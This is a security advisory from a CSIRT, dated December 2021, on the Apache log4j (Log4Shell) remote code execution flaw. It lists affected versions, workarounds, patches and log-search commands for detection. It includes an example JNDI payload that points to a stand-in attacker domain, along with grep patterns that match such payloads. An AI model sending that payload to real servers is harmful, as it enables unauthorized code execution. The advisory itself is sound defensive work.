## NVISO CSIRT ADVISORY
**Last update: 2021-12-13**


## SUMMARY
In this advisory we provide an overview of the recently discovered vulnerability in Apache log4j and how attackers can abuse it. We will update this blog post as more information is released. 

A high severity vulnerability in Apache log4j was disclosed publicly on 9 December 2021. This vulnerability was initially discovered by Chen Zhaojun of the Alibaba Cloud Security Team.

Log4j is an open-source Java logging library that is widely used in many applications and is present as a dependency in many services. This includes enterprise applications and numerous cloud services. 
 
This vulnerability allows for unauthenticated remote code execution using the following flow:
1.	Attacker sends data to the server (via any protocol). 
2.	The server (with log4j enabled) logs the data in the request, containing the malicious payload: `${jndi:ldap//attackerowneddomain.com/a}`
3.	The log4j vulnerability is triggered by this payload and the server makes a request to the attackerowneddomain.com via JNDI (Java Naming and Directory Interface). This also works using RMI (see link to SANS ISC post below)
5.	The server owned by the attacker responds to the request with a path to a remote (malicious) Java class file. This file is then injected in in the server process
6.	This malicious Java class file upon execution can trigger arbitrary code execution

## WHY THIS MATTERS
Given how widespread this library is used and how easy the exploit is, the impact of this vulnerability can be seen as very severe. 

On 10 December 2021 a PoC (Proof of Concept) was released for this vulnerability (https://github.com/tangxiaofeng7/apache-log4j-poc). Currently extensive scanning is being performed and a number of active exploitation attempts have been observed as well. In a first stage this vulnerability has been seen being used to deploy cryptocurrency mining software, this vulnerability will however be abused to gain an foothold in your network that can be used by a variety of attacks, now, or at a later stage (e.g. ransomware attacks, data theft, etc.). 


## RECOMMENDED ACTIONS
Critical risk vulnerabilities should be fully patched as soon as possible. 

Given the ease of exploitation it is strongly suggested to apply the patches for internet facing software immediately. Applying the patches to your internal software is recommended to be done at your earliest convenience.


## AFFECTED PRODUCTS
All Apache log4j versions from 2.0 up to and including 2.14.1 

All frameworks that use these versions (e.g. Apache Structs2, Apache Solr, Apache Druid, Apache Flink, etc.)


## AVAILABLE WORKAROUNDS
It is important to note that as part of the exploitation of this vulnerability, the vulnerable server must make an outbound request to the attacker owned server. Limiting outbound internet connectivity from web servers would prevent the full exploit chain. 

Sanitize log data before processing into Log4j

Specific mitigations:
- For version >=2.10: set `log4j2.formatMsgNoLookups` to `true`
- For releases from 2.0 to 2.10.0: you may want to remove the LDAP class from log4j completely by issuing the following command: `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`
- For certain JVM Versions, it is possible to set `com.sun.jndi.rmi.object.trustURLCodebase` and `com.sun.jndi.cosnaming.object.trustURLCodebase` to false to mitigate the vulnerability. Some JVM versions already have this as default setting


Several of the above recommendations have been nicely visualized by the Swiss Government CERT: https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/

## AVAILABLE PATCHES
On December 10, 2021, version 2.15.0 RC2 was released. 
(https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2)

## DETECTIONS
- Review logs generated for Log4j processing and focus on JNDI and RMI entries
- Review outbound connections of system running Log4j
- YARA rule by Florian Roth: https://gist.github.com/Neo23x0/e4c8b03ff8cdf1fa63b7d15db6e3860b
- Log4shell detector by Florian Roth: https://github.com/Neo23x0/log4shell-detector
- Scan your servers for potentially vulnerable libraries based on the hashes provided by Mubix: https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes/

Search logs using following commands (the above mentioned Log4shell detector will give you a better view):

`sudo egrep -i -r '\$\{jndi:(ldap[s]?|rmi|dns):/[^\n]+' /var/log`

`sudo find /var/log -name \*.gz -print0 | xargs -0 zgrep -E -i '\$\{jndi:(ldap[s]?|rmi|dns):/[^\n]+'`
